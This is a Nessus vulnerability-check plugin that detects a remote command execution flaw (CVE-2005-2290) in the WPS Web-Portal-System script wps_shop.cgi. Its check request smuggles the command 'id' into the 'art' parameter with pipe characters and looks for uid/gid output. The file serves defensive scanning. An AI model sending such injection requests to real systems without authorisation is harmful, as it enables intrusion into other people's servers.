#
# (C) Tenable Network Security
#

desc = "
Synopsis :

The remote web server contains a CGI script that is prone to arbitrary
command execution. 

Description :

The remote host is running the WPS Web-Portal-System.

The version of this software installed on the remote host is
vulnerable to remote command execution flaw through the argument 'art'
of the script 'wps_shop.cgi'.  A malicious user could exploit this
flaw to execute arbitrary commands on the remote host. 

See also :

http://www.securityfocus.com/archive/1/405100

Solution : 

Disable or delete this script.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if(description)
{
 script_id(19306);
 script_bugtraq_id(14245);
 script_cve_id("CVE-2005-2290");
  
 script_version("$Revision: 1.3 $");
 name["english"] = "WPS wps_shop.cgi remote command execution flaw";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Checks for WPS wps_shop.cgi remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			extra_dirs:make_list("/cgi-bin/wps"),
			check_request:"/wps_shop.cgi?action=showartikel&cat=nessus&catname=nessus&art=|id|",
			extra_check:"<small> WPS v\.[0-9]+\.[0-9]+\.[0-9]+</a><small>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
